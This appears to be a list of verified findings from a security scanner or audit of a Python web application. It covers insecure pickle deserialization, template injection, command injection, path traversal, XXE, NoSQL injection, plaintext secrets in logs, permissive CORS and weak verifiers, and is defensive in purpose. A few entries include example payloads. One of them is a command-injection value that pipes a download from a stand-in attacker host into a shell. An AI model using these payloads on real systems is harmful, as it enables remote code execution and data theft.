extra.message: Insecure deserialization via pickle.loads on user-controlled body — Remote code execution on the server via a crafted pickle payload [verified: pickle.loads on fully attacker-controlled body/query param with no allow-list or signing check enables RCE.]

Server-side template injection (SSTI) — Arbitrary Jinja2 expression evaluation, potentially leading to remote code execution via Jinja sandbox escape (e.g. {{ self.__init__.__globals__... }}) [verified: 'fragment' is concatenated into the template source string before render(), so Jinja syntax in fragment is evaluated as code, enabling SSTI/RCE.]

OS command injection in ping probe endpoint — Arbitrary shell command execution on the server (e.g. host='127.0.0.1; curl attacker | sh') [verified: os.system string concatenation with unsanitized 'host' param allows shell metacharacter injection.]
OS command injection in ping probe endpoint — Arbitrary OS command execution on the server [verified: Duplicate of idx 1: same os.system command injection via unsanitized 'host'.]

Hardcoded/default fallback SECRET_KEY used for session/token signing — Forged session/auth tokens if the operator forgets to override the default secret in production [verified: secret_key defaults to a fixed publicly-known literal with no runtime check forbidding its use in production, so any deployment that omits SECRET_KEY env var signs sessions/tokens with a value attackers can read from source.]

Mass assignment allows privilege/business-state escalation — Attacker can set role='admin', approved=true, or arbitrary balance by supplying those keys in the JSON payload [verified: workset.update(payload) merges arbitrary user JSON into privileged fields with no allow-list.]

Path traversal / arbitrary file write via 'ref' parameter — Attacker can write a JSON file (containing SSN/card data) to arbitrary locations outside the export directory, e.g. ref='../../../etc/cron.d/x' [verified: 'ref' is interpolated into a filesystem path with no traversal sanitization, allowing writes outside BASE_EXPORT_DIR.]

Reflected XSS via unescaped Jinja |safe rendering — Attacker-controlled HTML/JS executes in the victim's browser session (stored/reflected XSS) [verified: Jinja |safe on attacker-controlled 'card' param disables autoescaping and reflects raw HTML/JS.]

Path traversal / arbitrary file write via 'name' parameter — Attacker-controlled filename with '../' can write arbitrary bytes to arbitrary filesystem paths reachable by the server process [verified: 'name' is used unsanitized to build the write path with attacker-controlled bytes, no traversal checks.]

NoSQL injection via unrestricted MongoDB filter — Attacker can craft query operators to bypass intended filtering, extract unintended records, or (with $where) execute server-side JS in MongoDB [verified: Fully user-controlled dict passed directly as MongoDB filter with no schema restriction, enabling operator injection.]

XXE via XML parser with external entity resolution enabled — Attacker-supplied XML with external entities can read local files or trigger SSRF via entity expansion [verified: XMLParser configured with load_dtd=True and resolve_entities=True on attacker-supplied XML enables XXE.]

Plaintext password-reset token written to mailbox log file — Account takeover via reset-token theft from a world-readable/log-shipped file; same class of secret-to-logs exposure confirmed in loan_operations.py wire logging [verified: Raw reset token plus email is written in plaintext to an append-only log file with no redaction, and reset succeeds solely from possessing the token (auth.py:263), so anyone with read access to that log file (backups, log shipping, misconfigured static serving) can take over accounts within the 30-minute window.]

Plaintext initial password written to mailbox log on user creation — Anyone able to read the log file obtains valid plaintext credentials for newly created accounts [verified: Line 79-80 writes the generated plaintext initial_pw to password_reset_mailbox.log alongside the email, with no encryption or access control on that log path.]

Plaintext temporary password written to mailbox log on admin reset — Credential exposure allowing account takeover for any user whose password an admin resets [verified: Line 147-148 writes the plaintext new_pw temporary password to the same mailbox log on admin-triggered reset, enabling account takeover for anyone who can read the file.]

Sensitive data (credentials/PII) written to logs — Bearer tokens, API keys, and PII in request bodies are persisted in plaintext log files, exposing them to anyone with log access [verified: Full request body and raw Authorization header logged verbatim with no redaction.]

Open redirect via unvalidated 'lane' parameter — Can be used for phishing by redirecting authenticated users to an attacker-controlled domain [verified: RedirectResponse(lane) redirects to fully attacker-controlled value with no allow-list/same-origin check.]

Business logic tampering of ledger balance/state — Attacker can set arbitrary ledger balance or force state to 'approved' by controlling the request body [verified: 'amount' and 'state' from client JSON directly mutate ledger with no bounds/ownership validation.]

Weak, brute-forceable verifier check with no rate limiting — Attacker can brute-force the 4-digit verifier to pass the identity check for a known handle [verified: 4-digit numeric verifier checked by simple equality with no rate limiting, brute-forceable in ~10000 requests.]

Permissive CORS with credentials allowed for any origin — Any malicious website can make authenticated cross-origin requests to this endpoint and read the response, enabling session/data theft [verified: Origin header reflected verbatim into Access-Control-Allow-Origin alongside Allow-Credentials: true.]

Disabled TLS certificate verification on outbound request — Outbound connection is vulnerable to man-in-the-middle interception/tampering [verified: ssl._create_unverified_context() explicitly disables certificate verification on outbound HTTPS request.]

Privilege escalation via client-controlled cookie/header value — Any caller who already has the internal ops token can trivially self-elevate to a privileged 'lead' lane by setting a cookie/header, with no real authorization check [verified: Elevated access granted purely by a client-suppliable cookie/header value with no real identity/role verification.]

Plaintext initial password written to mailbox log during lead import — Bulk exposure of plaintext credentials for many imported borrower accounts in one file [verified: Plaintext initial passwords for every imported borrower are appended to a shared, predictably-named log file with no encryption or access restriction shown, exposing bulk credentials to anyone able to read that file.]

Security headers explicitly disabled — Weakens browser-side XSS/CSP protections for consumers of this endpoint [verified: Security headers explicitly weakened (X-XSS-Protection:0, empty CSP) removing defense-in-depth.]
